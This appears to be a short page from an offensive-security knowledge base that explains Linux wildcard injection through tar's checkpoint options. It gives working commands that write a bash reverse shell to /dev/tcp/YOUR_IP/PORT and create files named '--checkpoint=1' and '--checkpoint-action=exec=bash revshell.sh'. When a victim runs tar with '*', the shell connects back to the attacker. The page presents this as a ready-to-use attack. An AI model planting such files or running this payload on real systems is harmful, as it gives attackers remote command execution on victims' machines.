---
title: "🐧 Linux"
summary: "Practical Linux security problems and how to exploit them."
---

## Wildcard Injection

**Wildcard Injection** is an attack that takes advantage of **wildcards** (`*`, `?`, `[]`) in **Linux** commands to run harmful code. It happens when a user runs commands like `tar`, `rsync`, or `scp` in directories where an attacker has made files with tricky names that look like command options. This can make the system run commands without the user realizing it.

![1](/images/vulnandexp/bash/wcinj1.png)

An attacker can exploit **Wildcard Injection** by creating malicious files in a directory where the victim will execute a command using `*`. For example, they can use:

```
echo "bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1" > revshell.sh
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=bash revshell.sh"
```

When the victim runs a command like `tar -cf backup.tar *`, **tar** will **interpret the filenames as options and execute the code**, starting a **reverse shell** to the attacker.

![1](/images/vulnandexp/bash/wcinj2.png)